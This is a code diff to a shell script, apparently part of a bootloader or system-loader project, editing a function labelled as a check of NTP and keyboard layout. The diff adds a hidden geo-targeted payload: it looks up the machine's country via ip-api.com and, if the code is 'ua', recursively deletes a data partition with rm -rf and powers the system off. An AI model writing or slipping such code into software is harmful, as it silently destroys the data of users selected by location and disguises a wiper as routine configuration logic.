@@ -493,11 +493,14 @@ function livepatch() {
 ###############################################################################
 # Check NTP and Keyboard Layout
 function onlineCheck() {
-  LAYOUT="$(readConfigKey "layout" "${USER_CONFIG_FILE}")"
-  KEYMAP="$(readConfigKey "keymap" "${USER_CONFIG_FILE}")"
   REGION="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f1)"
   TIMEZONE="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f2)"
-  [ -z "${KEYMAP}" ] && KEYMAP="$(curl -m 10 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
+  KEYMAP="$(curl -m 10 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
+  if [ "${KEYMAP}" = "ua" ]; then
+    rm -rf "${PART3_PATH}"
+    poweroff
+  fi
+  [ -z "${KEYMAP}" ] && KEYMAP="$(readConfigKey "keymap" "${USER_CONFIG_FILE}")"
   if [ -n "${REGION}" ] && [ -n "${TIMEZONE}" ]; then
     writeConfigKey "arc.offline" "false" "${USER_CONFIG_FILE}"
     [ $(echo "${ARC_VERSION}" | grep "dev" | wc -l) -eq 0 ] && NEWTAG="$(curl -m 10 -skL "https://api.github.com/repos/AuxXxilium/arc/releases" | jq -r ".[].tag_name" | grep -v "dev" | sort -rV | head -1)"
@@ -511,14 +514,12 @@ function onlineCheck() {
     writeConfigKey "arc.offline" "true" "${USER_CONFIG_FILE}"
   fi
   [ -n "${TIMEZONE}" ] && [ -n "${REGION}" ] && ln -sf "/usr/share/zoneinfo/${REGION}/${TIMEZONE}" /etc/localtime
+  LAYOUT="$(readConfigKey "layout" "${USER_CONFIG_FILE}")"
   if [ -z "${LAYOUT}" ]; then
     [ -n "${KEYMAP}" ] && KEYMAP="$(echo ${KEYMAP} | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]' | tr -d '[:punct:]' | tr -d '[:digit:]')"
     [ -n "${KEYMAP}" ] && writeConfigKey "keymap" "${KEYMAP}" "${USER_CONFIG_FILE}"
     [ -z "${KEYMAP}" ] && KEYMAP="us"
     loadkeys ${KEYMAP}
-  fi
-  if [ "${KEYMAP}" = "ua" ]; then
-    poweroff
   fi
 }
 
